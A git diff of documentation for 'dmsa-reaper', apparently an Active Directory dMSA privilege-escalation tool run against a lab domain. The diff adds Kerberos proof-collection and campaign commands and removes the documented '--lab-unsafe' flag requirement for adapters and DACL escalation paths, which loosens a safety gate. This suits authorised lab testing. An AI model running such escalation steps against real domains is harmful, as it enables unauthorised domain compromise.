@@ -161,6 +161,36 @@ externally verified:
 }
 ```
 
+Collect a safe base proof inside Exegol:
+
+```bash
+export DOMAIN=dmsalab.local
+export DC_HOST=DMSA.dmsalab.local
+export KRB5_CONFIG=/etc/krb5.conf
+export KRB5CCNAME=/workspace/reaper.low.ccache
+
+scripts/exegol_collect_base_proof.sh
+```
+
+Use a raw ccache path for Impacket/NXC (`/workspace/reaper.low.ccache`), not
+`FILE:/workspace/reaper.low.ccache`. Use the DC FQDN for Kerberos. `C$` denied
+for `reaper.low` is normal; SYSVOL and NETLOGON are the low-privilege proof
+targets.
+
+Campaigns can consume the base proof without claiming dMSA proof:
+
+```bash
+dmsa-reaper campaign run \
+  --profile badsuccessor-lab \
+  --domain dmsalab.local --dc-ip <DC_IP> \
+  -u reaper.low -p '<PASSWORD>' \
+  --scope docs/lab-scope-dmsalab.json \
+  --confirm-string dmsalab.local \
+  --base-proof kerberos-base-proof.json \
+  --rollback-policy always \
+  --json campaign.json
+```
+
 Record it:
 
 ```bash
@@ -183,9 +213,8 @@ dmsa-reaper verify \
   --ops-dir .reaper/lab-runs/direct
 ```
 
-Adapter execution requires `--lab-unsafe-kerberos-proof`, `--scope`, and
-`--confirm-string`; the adapter must emit the same structured JSON proof on
-stdout. No adapter runs by default.
+Adapter execution requires `--scope` and `--confirm-string`; the adapter must
+emit the same structured JSON proof on stdout. No adapter runs by default.
 
 Example external validation command, to be run separately on a Windows host with
 access to the DC on port 88:
@@ -273,7 +302,7 @@ dmsa-reaper paths --state state-norights.json --expand-targets
 
 ---
 
-## Scenario 5: DACL-only path (reaper.dacl — non-executable without --lab-unsafe)
+## Scenario 5: DACL-only path (reaper.dacl)
 
 ```bash
 dmsa-reaper map \
@@ -283,9 +312,9 @@ dmsa-reaper map \
 
 dmsa-reaper paths --state state-dacl.json --expand-targets
 # Expected: dacl-container-escalate and/or dacl-target-escalate paths
-# These require --lab-unsafe + scope.allowDaclPrimitives=true to execute
+# These require scope.allowDaclPrimitives=true to execute
 
-# Verify the path is classified as executable=true but requires lab flags:
+# Verify the path is classified as executable=true:
 # dacl-container-escalate on OU=DMSA-DACL-Only
 # dacl-target-escalate on CN=victim.dacl
 ```
